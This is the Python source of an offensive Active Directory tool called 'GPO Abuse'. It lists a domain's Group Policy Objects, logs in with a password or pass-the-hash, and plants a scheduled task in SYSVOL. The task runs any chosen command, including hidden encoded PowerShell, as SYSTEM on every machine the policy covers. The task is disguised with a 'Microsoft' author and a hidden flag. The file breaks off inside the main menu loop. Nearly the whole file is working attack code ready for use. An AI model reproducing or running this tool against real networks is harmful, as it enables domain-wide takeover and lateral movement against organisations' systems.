#!/usr/bin/env python3
"""
    ╔═══════════════════════════════════════════════════════════╗
    ║                  G P O   A B U S E                        ║
    ║         Scheduled Task Injection via GPO                  ║
    ╚═══════════════════════════════════════════════════════════╝
"""

import sys
import re
import os
import socket
import signal
import logging
import getpass
import ipaddress
import hashlib
import ctypes
import base64
from datetime import datetime
from binascii import hexlify

# =============================================================================
# MD4 FIX: Enable legacy OpenSSL providers for NTLM authentication
# =============================================================================
def _enable_md4():
    """Try to enable MD4 support for NTLM authentication."""
    try:
        ctypes.CDLL("libssl.so.3").OSSL_PROVIDER_load(None, b"legacy")
        ctypes.CDLL("libssl.so.3").OSSL_PROVIDER_load(None, b"default")
        return True
    except:
        pass
    try:
        ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"legacy")
        ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"default")
        return True
    except:
        pass
    try:
        from Crypto.Hash import MD4
        return True
    except ImportError:
        pass
    return False

_MD4_ENABLED = _enable_md4()

# =============================================================================
# COLORAMA INIT
# =============================================================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class _DummyFore:
        def __getattr__(self, name):
            return ''
    class _DummyStyle:
        def __getattr__(self, name):
            return ''
    Fore = _DummyFore()
    Style = _DummyStyle()

logging.getLogger().setLevel(logging.ERROR)

# =============================================================================
# GLOBALS & INTERRUPT HANDLING
# =============================================================================
INTERRUPTED = False

def signal_handler(sig, frame):
    global INTERRUPTED
    INTERRUPTED = True
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# =============================================================================
# BANNER
# =============================================================================
def banner():
    print(Fore.MAGENTA + """
    ╔═══════════════════════════════════════════════════════════╗
    ║                 G P O   A B U S E                         ║
    ║         Scheduled Task Injection via GPO                  ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)

# =============================================================================
# VALIDATORS (Same style as ForceChangePassword template)
# =============================================================================
def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_hash(hash_str):
    if ':' in hash_str:
        parts = hash_str.split(':')
        if len(parts) == 2:
            lm, nt = parts
            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
        return False
    else:
        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)


def validate_guid(guid_str):
    """Validate GPO GUID format (with or without braces)."""
    pattern = r'^\{?[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\}?$'
    return bool(re.match(pattern, guid_str))


# =============================================================================
# SAFE INPUT HANDLER (Ctrl+C safe, same style as template)
# =============================================================================
def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default=None):
    """Robust input handler with validation, defaults, and Ctrl+C safety."""
    while True:
        try:
            display_prompt = prompt
            if default is not None:
                display_prompt = prompt.replace(': ', ' [%s]: ' % default)

            value = input(display_prompt).strip()

            if not value and default is not None:
                value = default

            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue

            if validator and value and not validator(value):
                print(Fore.RED + "[!] %s" % error_msg + Style.RESET_ALL)
                continue

            return value

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)
        except EOFError:
            print(Fore.YELLOW + "\n[!] Input interrupted. Returning..." + Style.RESET_ALL)
            return None


def get_password_input(prompt, validator=None, error_msg=None, default=None):
    """Secure password input with getpass."""
    while True:
        try:
            display_prompt = prompt
            if default is not None:
                display_prompt = prompt.replace(': ', ' [%s]: ' % default)

            value = getpass.getpass(display_prompt).strip()

            if not value and default is not None:
                value = default

            if not value:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue

            if validator and value and not validator(value):
                print(Fore.RED + "[!] %s" % error_msg + Style.RESET_ALL)
                continue

            return value

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)
        except EOFError:
            print(Fore.YELLOW + "\n[!] Input interrupted. Returning..." + Style.RESET_ALL)
            return None


# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================
def get_base_dn(domain):
    """Convert domain FQDN to LDAP base DN."""
    return ','.join(["DC=%s" % part for part in domain.split('.')])


def check_ip_reachable(ip, port=445, timeout=3):
    """Check if host is reachable on a given port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def check_dc_ports(dc_ip):
    """Check common AD ports on DC."""
    ports = {
        53: "DNS",
        88: "Kerberos",
        135: "RPC",
        389: "LDAP",
        445: "SMB",
        636: "LDAPS",
        3268: "Global Catalog"
    }
    open_ports = []
    for port, name in ports.items():
        if check_ip_reachable(dc_ip, port, timeout=2):
            open_ports.append("%s(%d)" % (name, port))
    return open_ports


# =============================================================================
# IMPACKET IMPORT (with graceful fallback)
# =============================================================================
try:
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.ldap import ldap as impacket_ldap, ldapasn1
    IMPACKET_AVAILABLE = True
except ImportError:
    print(Fore.YELLOW + "[!] impacket library not found. Install with: pip install impacket" + Style.RESET_ALL)
    IMPACKET_AVAILABLE = False
    sys.exit(1)

# Check MD4 availability
try:
    hashlib.new("md4", b"test")
    MD4_AVAILABLE = True
except ValueError:
    MD4_AVAILABLE = False
    print(Fore.YELLOW + "[!] Warning: MD4 hash not available. NTLM auth may fail." + Style.RESET_ALL)
    print(Fore.YELLOW + "    Fix: pip install pycryptodome OR enable OpenSSL legacy provider" + Style.RESET_ALL)


# #############################################################################
# GPO ABUSE ENGINE -- Core Class
# #############################################################################
class GPOAbuseEngine:
    """
    GPO Abuse Engine -- Scheduled Task Injection via SYSVOL

    Supports:
    - GPO Enumeration via LDAP
    - Scheduled Task Injection into GPO
    - GPO Rollback (cleanup)
    - Pass-the-Hash authentication
    """

    def __init__(self, dc_ip, domain, username, password, auth_type='password',
                 lmhash='', nthash=''):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.auth_type = auth_type
        self.lmhash = lmhash
        self.nthash = nthash
        self.smb_conn = None
        self.ldap_conn = None
        self.base_dn = get_base_dn(domain)
        self.logger = self._setup_logger()

    def _setup_logger(self):
        """Setup file logging."""
        logger = logging.getLogger("gpo_abuse")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            fh = logging.FileHandler("gpo_abuse.log")
            fh.setLevel(logging.DEBUG)
            formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            fh.setFormatter(formatter)
            logger.addHandler(fh)

        return logger

    # -------------------------------------------------------------------------
    # SMB CONNECTION
    # -------------------------------------------------------------------------
    def connect_smb(self):
        """Establish SMB connection with comprehensive error handling."""
        if self.smb_conn:
            return True

        print(Fore.YELLOW + "[*] Connecting to SMB: %s:445" % self.dc_ip + Style.RESET_ALL)

        try:
            self.smb_conn = SMBConnection(self.dc_ip, self.dc_ip, sess_port=445, timeout=10)

            if self.auth_type == 'hash':
                self.smb_conn.login(self.username, '', self.domain, self.lmhash, self.nthash)
            else:
                self.smb_conn.login(self.username, self.password, self.domain)

            print(Fore.GREEN + "[+] SMB authenticated as %s@%s" % (self.username, self.domain) + Style.RESET_ALL)
            self.logger.info("[+] SMB connection established to %s as %s", self.dc_ip, self.username)
            return True

        except Exception as e:
            print(Fore.RED + "[-] SMB connection failed: %s" % e + Style.RESET_ALL)
            print(Fore.RED + "    -> Check: Wrong credentials? Firewall blocking SMB?" + Style.RESET_ALL)
            self.logger.error("[-] SMB connection failed: %s", e)
            return False

    # -------------------------------------------------------------------------
    # LDAP CONNECTION
    # -------------------------------------------------------------------------
    def connect_ldap(self):
        """Establish LDAP connection for GPO enumeration."""
        if self.ldap_conn:
            return True

        print(Fore.YELLOW + "[*] Connecting to LDAP: %s" % self.dc_ip + Style.RESET_ALL)

        try:
            self.ldap_conn = impacket_ldap.LDAPConnection("ldap://%s" % self.dc_ip, self.base_dn)

            if self.auth_type == 'hash':
                self.ldap_conn.login(self.username, '', self.domain, self.lmhash, self.nthash)
            else:
                self.ldap_conn.login(self.username, self.password, self.domain)

            print(Fore.GREEN + "[+] LDAP authenticated" + Style.RESET_ALL)
            self.logger.info("[+] LDAP connection established to %s", self.dc_ip)
            return True

        except Exception as e:
            print(Fore.RED + "[-] LDAP connection failed: %s" % e + Style.RESET_ALL)
            self.logger.error("[-] LDAP connection failed: %s", e)
            return False

    # -------------------------------------------------------------------------
    # VERIFY DOMAIN
    # -------------------------------------------------------------------------
    def verify_domain(self):
        """Verify domain exists on DC via LDAP anonymous bind."""
        print(Fore.YELLOW + "[*] Verifying domain '%s' against DC..." % self.domain + Style.RESET_ALL)

        try:
            conn = impacket_ldap.LDAPConnection("ldap://%s" % self.dc_ip)
            resp = conn.search(
                searchFilter="(objectClass=*)",
                attributes=["defaultNamingContext", "rootDomainNamingContext"],
                searchBase=""
            )

            naming_contexts = []
            for item in resp:
                if not isinstance(item, ldapasn1.SearchResultEntry):
                    continue
                for attr in item['attributes']:
                    n = str(attr['type'])
                    vals = [str(x) for x in attr['vals']]
                    if n in ("defaultNamingContext", "rootDomainNamingContext"):
                        naming_contexts.extend(vals)

            domain_dn = get_base_dn(self.domain)

            for nc in naming_contexts:
                if domain_dn.lower() == nc.lower():
                    print(Fore.GREEN + "[+] Domain '%s' verified on DC!" % self.domain + Style.RESET_ALL)
                    return True

            available = [nc.replace("DC=", "").replace(",DC=", ".") for nc in naming_contexts]
            hint = " Available: %s" % ', '.join(available) if available else ""
            print(Fore.RED + "[-] Domain '%s' not found on DC.%s" % (self.domain, hint) + Style.RESET_ALL)
            return False

        except Exception as e:
            err_str = str(e)
            if "successful bind must be completed" in err_str or "operationsError" in err_str:
                print(Fore.YELLOW + "[!] DC requires LDAP authentication. Domain will be validated during login." + Style.RESET_ALL)
                return True
            print(Fore.RED + "[-] Cannot verify domain: %s" % e + Style.RESET_ALL)
            return False

    # -------------------------------------------------------------------------
    # VERIFY CREDENTIALS
    # -------------------------------------------------------------------------
    def verify_credentials(self):
        """Verify credentials via SMB or LDAP."""
        print(Fore.YELLOW + "[*] Verifying credentials..." + Style.RESET_ALL)

        if self.connect_smb():
            print(Fore.GREEN + "[+] Credentials verified via SMB!" + Style.RESET_ALL)
            return True

        if self.connect_ldap():
            print(Fore.GREEN + "[+] Credentials verified via LDAP!" + Style.RESET_ALL)
            return True

        print(Fore.RED + "[-] Invalid credentials or domain unreachable!" + Style.RESET_ALL)
        return False

    # -------------------------------------------------------------------------
    # GPO ENUMERATION
    # -------------------------------------------------------------------------
    def enumerate_gpos(self):
        """Enumerate all GPOs in the domain via LDAP."""
        if not self.ldap_conn:
            if not self.connect_ldap():
                print(Fore.RED + "[!] LDAP connection required." + Style.RESET_ALL)
                return []

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           G P O   E N U M E R A T I O N" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

        ldap_filter = "(&(objectClass=groupPolicyContainer)(cn=*))"
        attrs = ["displayName", "cn", "gPCFileSysPath", "gPCMachineExtensionNames", "versionNumber"]

        print(Fore.YELLOW + "[*] Querying GPOs..." + Style.RESET_ALL)

        try:
            resp = self.ldap_conn.search(
                searchFilter=ldap_filter,
                attributes=attrs,
                searchBase="CN=Policies,CN=System," + self.base_dn
            )

            gpos = []
            for item in resp:
                if not isinstance(item, ldapasn1.SearchResultEntry):
                    continue

                name, guid, path, version = "", "", "", "0"
                for attr in item['attributes']:
                    n = str(attr['type'])
                    v = [str(x) for x in attr['vals']]
                    if n == "displayName":
                        name = v[0]
                    elif n == "cn":
                        guid = v[0]
                    elif n == "gPCFileSysPath":
                        path = v[0]
                    elif n == "versionNumber":
                        version = v[0]

                if guid:
                    gpos.append({
                        "name": name,
                        "guid": guid,
                        "path": path,
                        "version": version
                    })

            if not gpos:
                print(Fore.YELLOW + "[!] No GPOs found." + Style.RESET_ALL)
                return []

            print(Fore.GREEN + "\n[+] Found %d GPO(s):" % len(gpos) + Style.RESET_ALL)
            print("\n  %-35s %-40s %s" % ("NAME", "GPO ID (GUID)", "VERSION"))
            print("  %s %s %s" % ("─" * 35, "─" * 40, "─" * 7))

            for gpo in gpos:
                name_str = gpo['name'] or "(no name)"
                flag = ""
                if "Default Domain Policy" in name_str:
                    flag = "  %s← Default Domain Policy (high impact!)%s" % (Fore.RED, Style.RESET_ALL)
                elif "Default Domain Controllers" in name_str:
                    flag = "  %s← DC Policy (very high impact!)%s" % (Fore.RED, Style.RESET_ALL)

                print("  %s%-35s%s %s%-40s%s %s%s" % (
                    Fore.CYAN, name_str, Style.RESET_ALL,
                    Fore.WHITE, gpo['guid'], Style.RESET_ALL,
                    gpo['version'], flag
                ))

            print(Fore.GREEN + "\n[+] Total GPOs: %d" % len(gpos) + Style.RESET_ALL)
            print(Fore.YELLOW + "\n[!] Tip: Look for GPOs where you have WriteGPLink or GenericWrite rights." + Style.RESET_ALL)

            self.logger.info("[+] Enumerated %d GPOs", len(gpos))
            return gpos

        except Exception as e:
            print(Fore.RED + "[-] LDAP query error: %s" % e + Style.RESET_ALL)
            self.logger.error("[-] GPO enumeration failed: %s", e)
            return []

    # -------------------------------------------------------------------------
    # UPDATE EXTENSION NAMES
    # -------------------------------------------------------------------------
    def _update_extension_names(self, extension_name):
        """Update gPCMachineExtensionNames to include Scheduled Tasks."""
        val1 = "00000000-0000-0000-0000-000000000000"
        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
        val3 = "AADCED64-746C-4633-A97C-D61349046527"

        if isinstance(extension_name, list):
            extension_name = ''.join(extension_name)

        if not extension_name:
            return "[{" + val1 + "}{" + val2 + "}][{" + val3 + "}{" + val2 + "}]"

        brackets = {}
        for m in re.finditer(r'\[([^\]]+)\]', extension_name):
            guids = re.findall(r'\{([^}]+)\}', m.group(1))
            if guids:
                brackets[guids[0]] = guids[1:]

        for leader in (val1, val3):
            brackets.setdefault(leader, [])
            if val2 not in brackets[leader]:
                brackets[leader].append(val2)

        result = ""
        for leader in sorted(brackets):
            result += "[{" + leader + "}" + "".join("{" + g + "}" for g in brackets[leader]) + "]"
        return result

    # -------------------------------------------------------------------------
    # UPDATE GPT.INI
    # -------------------------------------------------------------------------
    def _update_gpt_ini(self, gpo_id, new_version):
        """Update gpt.ini version number."""
        path = "%s/Policies/{%s}/gpt.ini" % (self.domain, gpo_id)
        print(Fore.YELLOW + "[*] Updating gpt.ini version -> %s" % new_version + Style.RESET_ALL)

        try:
            tid = self.smb_conn.connectTree("SYSVOL")
            fid = self.smb_conn.openFile(tid, path)
            content = self.smb_conn.readFile(tid, fid)

            try:
                text = content.decode("utf-8")
            except UnicodeDecodeError:
                text = content.decode("latin-1")

            new_content = re.sub(r'^Version\s*=\s*[0-9]+', 'Version=%s' % new_version, text, flags=re.MULTILINE)
            self.smb_conn.writeFile(tid, fid, new_content)
            self.smb_conn.closeFile(tid, fid)

            print(Fore.GREEN + "[+] gpt.ini updated" + Style.RESET_ALL)
            return True

        except Exception as e:
            print(Fore.RED + "[-] gpt.ini update failed: %s" % e + Style.RESET_ALL)
            return False

    # -------------------------------------------------------------------------
    # XML ESCAPE
    # -------------------------------------------------------------------------
    def _xml_escape(self, s):
        """Escape XML attribute values."""
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

    # -------------------------------------------------------------------------
    # GENERATE SCHEDULED TASK XML
    # -------------------------------------------------------------------------
    def _generate_scheduled_task_xml(self, task_name, command, powershell=False,
                                      description="", gpo_type="computer"):
        """Generate ScheduledTasks.xml content for GPO injection."""
        mod_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uid = "{12345678-1234-1234-1234-123456789012}"

        if powershell:
            encoded = base64.b64encode(command.encode('utf-16-le')).decode()
            exe = "powershell.exe"
            args = "-NoP -NonI -W Hidden -Exec Bypass -Enc %s" % encoded
        else:
            parts = command.split(" ", 1)
            exe = parts[0]
            args = parts[1] if len(parts) > 1 else ""

        esc_task = self._xml_escape(task_name)
        esc_desc = self._xml_escape(description)
        esc_exe = self._xml_escape(exe)
        esc_args = self._xml_escape(args)

        # Build XML line by line to avoid indentation issues
        lines = []
        lines.append('<?xml version="1.0" encoding="utf-8"?>')
        lines.append('<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A0CE7CA89D78}">')
        lines.append('  <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}"')
        lines.append('                   name="%s"' % esc_task)
        lines.append('                   image="0"')
        lines.append('                   changed="%s"' % mod_date)
        lines.append('                   uid="%s"' % uid)
        lines.append('                   userContext="0"')
        lines.append('                   removePolicy="0">')
        lines.append('    <Properties action="C"')
        lines.append('                name="%s"' % esc_task)
        lines.append('                runAs="NT AUTHORITY\\SYSTEM"')
        lines.append('                logonType="S4U">')
        lines.append('      <Task version="1.3">')
        lines.append('        <RegistrationInfo>')
        lines.append('          <Author>Microsoft</Author>')
        lines.append('          <Description>%s</Description>' % esc_desc)
        lines.append('        </RegistrationInfo>')
        lines.append('        <Principals>')
        lines.append('          <Principal id="Author">')
        lines.append('            <UserId>NT AUTHORITY\\SYSTEM</UserId>')
        lines.append('            <RunLevel>HighestAvailable</RunLevel>')
        lines.append('          </Principal>')
        lines.append('        </Principals>')
        lines.append('        <Settings>')
        lines.append('          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>')
        lines.append('          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>')
        lines.append('          <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>')
        lines.append('          <AllowHardTerminate>true</AllowHardTerminate>')
        lines.append('          <StartWhenAvailable>true</StartWhenAvailable>')
        lines.append('          <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>')
        lines.append('          <IdleSettings>')
        lines.append('            <StopOnIdleEnd>true</StopOnIdleEnd>')
        lines.append('            <RestartOnIdle>false</RestartOnIdle>')
        lines.append('          </IdleSettings>')
        lines.append('          <AllowStartOnDemand>true</AllowStartOnDemand>')
        lines.append('          <Enabled>true</Enabled>')
        lines.append('          <Hidden>true</Hidden>')
        lines.append('          <RunOnlyIfIdle>false</RunOnlyIfIdle>')
        lines.append('          <WakeToRun>false</WakeToRun>')
        lines.append('          <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>')
        lines.append('          <Priority>7</Priority>')
        lines.append('        </Settings>')
        lines.append('        <Triggers>')
        lines.append('          <TimeTrigger>')
        lines.append('            <StartBoundary>2015-01-01T00:00:00</StartBoundary>')
        lines.append('            <Enabled>true</Enabled>')
        lines.append('          </TimeTrigger>')
        lines.append('        </Triggers>')
        lines.append('        <Actions Context="Author">')
        lines.append('          <Exec>')
        lines.append('            <Command>%s</Command>' % esc_exe)
        lines.append('            <Arguments>%s</Arguments>' % esc_args)
        lines.append('          </Exec>')
        lines.append('        </Actions>')
        lines.append('      </Task>')
        lines.append('    </Properties>')
        lines.append('  </ImmediateTaskV2>')
        lines.append('</ScheduledTasks>')

        return "\n".join(lines)

    # -------------------------------------------------------------------------
    # ADD SCHEDULED TASK TO GPO
    # -------------------------------------------------------------------------
    def add_scheduled_task(self, gpo_id, task_name, command, powershell=False,
                           gpo_type="computer", force=False):
        """
        Inject a scheduled task into a GPO via SYSVOL.
        The task will execute as NT AUTHORITY\\SYSTEM on all machines under the GPO.
        """
        if not self.smb_conn:
            if not self.connect_smb():
                print(Fore.RED + "[!] SMB connection required." + Style.RESET_ALL)
                return False

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           ADD SCHEDULED TASK TO GPO" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.YELLOW + "  GPO ID:  %s" % gpo_id + Style.RESET_ALL)
        print(Fore.YELLOW + "  Command: %s" % command + Style.RESET_ALL)
        print(Fore.YELLOW + "  Type:    %s" % ('PowerShell (encoded)' if powershell else 'Direct') + Style.RESET_ALL)

        root_path = "Machine" if gpo_type == "computer" else "User"
        base = "%s/Policies/{%s}" % (self.domain, gpo_id)
        xml_path = "%s/%s/Preferences/ScheduledTasks/ScheduledTasks.xml" % (base, root_path)

        # Connect to SYSVOL
        try:
            tid = self.smb_conn.connectTree("SYSVOL")
            print(Fore.GREEN + "[+] Connected to SYSVOL" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[-] SYSVOL connect failed: %s" % e + Style.RESET_ALL)
            return False

        # Verify GPO exists
        try:
            self.smb_conn.listPath("SYSVOL", base + "/")
            print(Fore.GREEN + "[+] GPO %s found on SYSVOL" % gpo_id + Style.RESET_ALL)
        except Exception:
            print(Fore.RED + "[-] GPO %s not found -- check the GUID" % gpo_id + Style.RESET_ALL)
            return False

        # Create directory structure
        print(Fore.YELLOW + "[*] Creating directory structure..." + Style.RESET_ALL)
        for sub in [root_path,
                    "%s/Preferences" % root_path,
                    "%s/Preferences/ScheduledTasks" % root_path]:
            full = base + "/" + sub + "/"
            try:
                self.smb_conn.listPath("SYSVOL", full)
                print(Fore.GREEN + "    [+] Exists: %s" % sub + Style.RESET_ALL)
            except Exception:
                try:
                    self.smb_conn.createDirectory("SYSVOL", full)
                    print(Fore.GREEN + "    [+] Created: %s" % sub + Style.RESET_ALL)
                except Exception as e:
                    print(Fore.RED + "    [-] Cannot create %s: %s" % (sub, e) + Style.RESET_ALL)
                    print(Fore.YELLOW + "        Check WriteGPLink/GenericWrite rights on this GPO" + Style.RESET_ALL)
                    return False

        # Check if XML already exists
        fid = None
        try:
            fid = self.smb_conn.openFile(tid, xml_path)
            existing = self.smb_conn.readFile(tid, fid, singleCall=False).decode("utf-8")
            self.smb_conn.closeFile(tid, fid)
            fid = None

            if not force:
                print(Fore.YELLOW + "\n[!] ScheduledTasks.xml already exists!" + Style.RESET_ALL)
                print(Fore.YELLOW + "    Use force mode to overwrite it" + Style.RESET_ALL)
                for m in re.finditer(r'name="([^"]+)"', existing):
                    print(Fore.YELLOW + "    Existing task: %s" % m.group(1) + Style.RESET_ALL)
                return False

            print(Fore.YELLOW + "[!] Replacing existing ScheduledTasks.xml (force mode)" + Style.RESET_ALL)
        except Exception:
            print(Fore.YELLOW + "[*] Creating new ScheduledTasks.xml..." + Style.RESET_ALL)

        # Generate and write XML
        new_content = self._generate_scheduled_task_xml(
            task_name, command, powershell,
            description="GPO Abuse Task", gpo_type=gpo_type
        )

        try:
            fid = self.smb_conn.createFile(tid, xml_path)
            self.smb_conn.writeFile(tid, fid, new_content)
            self.smb_conn.closeFile(tid, fid)
            print(Fore.GREEN + "[+] ScheduledTasks.xml written to SYSVOL" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[-] Write failed: %s" % e + Style.RESET_ALL)
            if fid:
                self.smb_conn.closeFile(tid, fid)
            return False

        # Update gpt.ini version
        self._update_gpt_ini(gpo_id, 2)

        print(Fore.GREEN + "\n[+] GPO poisoned successfully!" + Style.RESET_ALL)
        print(Fore.CYAN + "\n[*] What happens next:" + Style.RESET_ALL)
        print(Fore.WHITE + "    -> Every machine under GPO %s will run your task" % gpo_id + Style.RESET_ALL)
        print(Fore.WHITE + "    -> Task runs as NT AUTHORITY\\SYSTEM" + Style.RESET_ALL)
        print(Fore.WHITE + "    -> Triggers on next Group Policy refresh (~90 min)" + Style.RESET_ALL)
        print(Fore.WHITE + "    -> Force immediate on target: gpupdate /force" + Style.RESET_ALL)

        self.logger.info("[+] Injected task '%s' into GPO %s", task_name, gpo_id)
        return True

    # -------------------------------------------------------------------------
    # ROLLBACK (CLEANUP)
    # -------------------------------------------------------------------------
    def rollback(self, gpo_id, gpo_type="computer"):
        """Remove injected scheduled task from GPO."""
        if not self.smb_conn:
            if not self.connect_smb():
                print(Fore.RED + "[!] SMB connection required." + Style.RESET_ALL)
                return False

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           ROLLBACK -- Remove Scheduled Task" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

        root = "Machine" if gpo_type == "computer" else "User"
        xml = "%s/Policies/{%s}/%s/Preferences/ScheduledTasks/ScheduledTasks.xml" % (
            self.domain, gpo_id, root
        )

        print(Fore.YELLOW + "[*] Deleting: %s" % xml + Style.RESET_ALL)

        try:
            self.smb_conn.deleteFile("SYSVOL", xml)
            print(Fore.GREEN + "[+] ScheduledTasks.xml deleted" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] GPO restored to clean state" + Style.RESET_ALL)
            self.logger.info("[+] Rolled back GPO %s", gpo_id)
            return True
        except SessionError as e:
            print(Fore.RED + "[-] Delete failed: %s" % e + Style.RESET_ALL)
            print(Fore.YELLOW + "    File may not exist or insufficient rights" + Style.RESET_ALL)
            return False


# #############################################################################
# MAIN MENU & INTERACTIVE FLOW
# #############################################################################
def show_menu():
    print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
    print(Fore.CYAN + "           G P O   A B U S E   M E N U" + Style.RESET_ALL)
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
    print("  %s[1]%s enum     %s-- List all GPOs in domain" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[2]%s add      %s-- Inject Scheduled Task into GPO" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[3]%s rollback %s-- Remove injected task" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
    print("  %s[0]%s exit" % (Fore.WHITE, Fore.CYAN) + Style.RESET_ALL)
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

    return get_input(
        Fore.CYAN + "\n[?] Your choice: " + Style.RESET_ALL,
        lambda x: x in ['0', '1', '2', '3'],
        "Invalid choice! Enter 0-3"
    )


def main():
    banner()

    # -- DC IP --
    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    open_ports = check_dc_ports(dc_ip)
    if not open_ports:
        print(Fore.RED + "[!] Cannot reach %s on common AD ports!" % dc_ip + Style.RESET_ALL)
        cont = get_input(
            Fore.YELLOW + "[?] Continue anyway? (y/N): " + Style.RESET_ALL,
            default="N"
        )
        if cont.lower() not in ('y', 'yes'):
            print(Fore.YELLOW + "[!] Exiting..." + Style.RESET_ALL)
            sys.exit(0)
    else:
        print(Fore.GREEN + "[+] DC %s reachable! Open ports: %s" % (dc_ip, ', '.join(open_ports)) + Style.RESET_ALL)

    # -- Domain --
    domain = get_input(
        Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
        validate_domain, "Invalid domain! Example: corp.local"
    )

    # -- Auth Type --
    print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Password")
    print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")

    auth_choice = get_input(
        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2'],
        "Invalid choice! Enter 1 or 2"
    )

    auth_type = 'password'
    lmhash = ''
    nthash = ''
    password = ''

    if auth_choice == '1':
        auth_type = 'password'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        password = get_password_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    elif auth_choice == '2':
        auth_type = 'hash'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        hash_input = get_input(
            Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT): " + Style.RESET_ALL,
            validate_hash, "Invalid hash! Format: LM:NT or just NT"
        )
        if ':' in hash_input:
            lmhash, nthash = hash_input.split(':')
        else:
            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            nthash = hash_input
        lmhash = lmhash.lower()
        nthash = nthash.lower()

    # -- Verify Domain --
    engine = GPOAbuseEngine(dc_ip, domain, username, password, auth_type, lmhash, nthash)

    if not engine.verify_domain():
        cont = get_input(
            Fore.YELLOW + "[?] Continue anyway? (y/N): " + Style.RESET_ALL,
            default="N"
        )
        if cont.lower() not in ('y', 'yes'):
            print(Fore.YELLOW + "[!] Exiting..." + Style.RESET_ALL)
            sys.exit(0)

    # -- Verify Credentials --
    print(Fore.YELLOW + "\n[*] Verifying credentials..." + Style.RESET_ALL)
    if not engine.verify_credentials():
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)

    # -- Main Menu Loop --
    while True:
        if INTERRUPTED:
            break

        choice = show_menu()

